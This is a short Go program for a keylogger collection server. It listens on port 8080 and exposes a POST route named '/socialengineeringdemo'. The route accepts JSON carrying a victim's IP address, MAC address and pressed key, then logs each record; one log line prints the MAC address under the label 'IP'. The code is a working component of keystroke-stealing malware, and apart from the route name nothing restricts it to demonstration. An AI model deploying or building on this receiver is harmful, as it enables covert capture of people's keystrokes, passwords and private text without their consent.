package main

import (
	"encoding/json"

	"github.com/buaazp/fasthttprouter"
	"github.com/sirupsen/logrus"
	"github.com/valyala/fasthttp"
)

func cast(b []byte) string {
	return string(b)
}

type Record struct {
	IP         string `json:"ip"`
	MACADDR    string `json:"macaddr"`
	PressedKey string `json:"pressedkey"`
}

func checkErr(err error) {
	if err != nil {
		logrus.Errorln(err)
	}
}

func keyListener(ctx *fasthttp.RequestCtx) {
	marshald := ctx.Request.Body()
	var rec Record
	json.Unmarshal(marshald, &rec)
	logrus.Println(rec)
	logrus.Println("IP: // " + rec.MACADDR + ": //" + rec.IP + "/ Keystroke:" + rec.PressedKey)
}
func main() {
	logrus.Println("started waiting requests...")
	router := fasthttprouter.New()
	router.POST("/socialengineeringdemo", keyListener)

	logrus.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))

}
